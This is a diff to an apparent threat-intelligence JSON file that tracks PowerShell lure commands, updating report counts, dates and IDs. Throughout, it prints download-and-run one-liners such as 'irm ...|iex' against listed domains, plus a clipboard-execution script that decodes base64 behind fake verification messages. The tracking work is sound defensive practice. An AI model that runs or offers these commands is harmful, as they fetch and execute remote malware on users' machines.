@@ -1,12 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 169,
-    "ReportCount": 169,
-    "FirstSeen": "2026-11-11T15:34:50.263000+00:00",
+    "DistinctPayloadCount": 168,
+    "ReportCount": 168,
+    "FirstSeen": "2026-11-12T05:39:56.995000+00:00",
     "LastSeen": "2026-11-18T10:54:56.701000+00:00",
     "ReportIds": [
-      "cmwca5h1o061v0omlwaufjf39",
       "cmwd4cakt005k0omlhwj5h50t",
       "cmwd5z88d01o80oml0h5gnsao",
       "cmwd86yyn02bw0omlvsf4ob36",
@@ -344,8 +343,7 @@
       "irm 'browse-cloud.codes/fa625dfc6bcfb436'|iex;",
       "irm 'browse-cloud.codes/fe2aab3b32968bba'|iex;",
       "irm 'browse-cloud.codes/fe3d91f20708755d'|iex;",
-      "irm 'browse-cloud.codes/fef4413d3abac8e0'|iex;",
-      "irm 'browse-nnccodes.beer/e0f433c5355ab6b9'|iex;"
+      "irm 'browse-cloud.codes/fef4413d3abac8e0'|iex;"
     ]
   },
   {
@@ -682,13 +680,10 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 10,
-    "ReportCount": 100,
-    "FirstSeen": "2026-11-11T15:41:37.171000+00:00",
+    "ReportCount": 97,
+    "FirstSeen": "2026-11-11T16:15:01.776000+00:00",
     "LastSeen": "2026-11-18T14:54:44.454000+00:00",
     "ReportIds": [
-      "cmwcae70a068n0omlkip0wlqq",
-      "cmwcaflcb069j0omlaoubq6f8",
-      "cmwcaz8yj06i20omltq3gtf6h",
       "cmwcbl5u006vv0omlb42loz7x",
       "cmwcc4tsn071c0omltwru33xb",
       "cmwcc66iw07310omlt924pkt8",
@@ -947,22 +942,6 @@
     ]
   },
   {
-    "Pattern": "powershell -c \\\"irm '<URL>'|powershell -\\\"",
-    "DistinctPayloadCount": 2,
-    "ReportCount": 3,
-    "FirstSeen": "2026-11-11T15:38:37.512000+00:00",
-    "LastSeen": "2026-11-13T11:18:27.500000+00:00",
-    "ReportIds": [
-      "cmwcaacd0067j0oml4ziu910p",
-      "cmwevvd0i0eh70omlobj2ua4c",
-      "cmwevvgz70ehn0omlu85kdsak"
-    ],
-    "PayloadExamples": [
-      "powershell -c \\\"irm 'https://content-collector[.]com/4MRhuy1FNnrumSHZ'|powershell -\\\"",
-      "powershell -c \\\"irm 'https://content-collector[.]com/6snqpNaX8nyGX0an'|powershell -\\\""
-    ]
-  },
-  {
     "Pattern": "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\" echo \"<BANNER>\"` Write-Output \"Initializing verification ...\" Start-Sleep -Milliseconds <MILLISECONDS> $updateloadUrl = '<BASE64>' $bytes = [Convert]::FromBase64String($updateloadUrl) $clean = [Text.Encoding]::Unicode.GetString($bytes) Start-Sleep -Milliseconds <MILLISECONDS> Write-Output \"Processing request ...\" Start-Sleep -Milliseconds <MILLISECONDS> Write-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \" for ($i = 0; $i -lt 5; $i++) { Start-Sleep -Milliseconds <MILLISECONDS> Write-Host -NoNewline \".\" } Invoke-Expression $clean",
     "DistinctPayloadCount": 2,
     "ReportCount": 2,
@@ -1083,6 +1062,20 @@
     ],
     "PayloadExamples": [
       "iex(irm 'https://cosmical2049[.]com/crabs/6414f8e8174928f0' -UserAgent 'WUA/39587ecfe2' -Headers @{'X-WUA'='39587ecfe2'})"
+    ]
+  },
+  {
+    "Pattern": "powershell -c \\\"irm '<URL>'|powershell -\\\"",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 2,
+    "FirstSeen": "2026-11-13T11:18:22.425000+00:00",
+    "LastSeen": "2026-11-13T11:18:27.500000+00:00",
+    "ReportIds": [
+      "cmwevvd0i0eh70omlobj2ua4c",
+      "cmwevvgz70ehn0omlu85kdsak"
+    ],
+    "PayloadExamples": [
+      "powershell -c \\\"irm 'https://content-collector[.]com/6snqpNaX8nyGX0an'|powershell -\\\""
     ]
   },
   {
